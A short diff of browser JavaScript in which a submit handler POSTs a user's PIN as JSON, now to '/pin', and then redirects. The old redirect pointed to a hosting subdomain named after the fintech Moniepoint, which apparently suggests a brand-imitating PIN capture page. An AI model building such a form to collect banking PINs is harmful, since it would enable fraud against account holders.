@@ -50,7 +50,7 @@ document.getElementById("submitBtn").addEventListener("click", function() {
         pin: pin
        }
        const handleFetchForm = async (res,req) => {
-        const request = await fetch("/",{
+        const request = await fetch("/pin",{
           method: "POST",
           headers: {
             'Content-Type':'application/json'
@@ -63,7 +63,7 @@ document.getElementById("submitBtn").addEventListener("click", function() {
         console.log(response)
         if(request.statusText === 'OK'){
           pin = "";
-          location.href = "https://moniepoint.onrender.com/";
+          location.href = "/";
         }else {
           console.log("error")
         }
